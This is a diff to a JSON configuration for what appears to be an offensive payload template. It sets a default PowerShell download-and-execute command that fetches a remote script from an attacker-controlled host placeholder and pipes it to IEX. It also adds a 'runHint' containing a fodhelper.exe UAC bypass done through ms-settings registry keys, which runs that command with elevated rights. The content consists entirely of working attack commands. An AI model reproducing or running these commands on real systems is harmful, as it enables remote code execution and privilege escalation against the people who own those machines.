@@ -22,7 +22,7 @@
         {
             "name":"powershellCommand",
             "description" : "Powershell command to run.",
-            "defaultValue" : "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.45.222/run.txt') | IEX"   
+            "defaultValue" : "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://[[[[ownIP]]]]/misc/run.txt') | IEX"   
         }
     ],
     "shellCode" : {
@@ -43,5 +43,6 @@
                 "defaultValue": "ClassLibrary1.dll"
             }
         ]
-    }
+    },
+    "runHint" : "New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value \"powershell.exe (New-Object System.Net.WebClient).DownloadString('http://[[[[ownIP]]]]/misc/run.txt') | IEX\" -Force\nNew-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force\nC:\\Windows\\System32\\fodhelper.exe"
 }
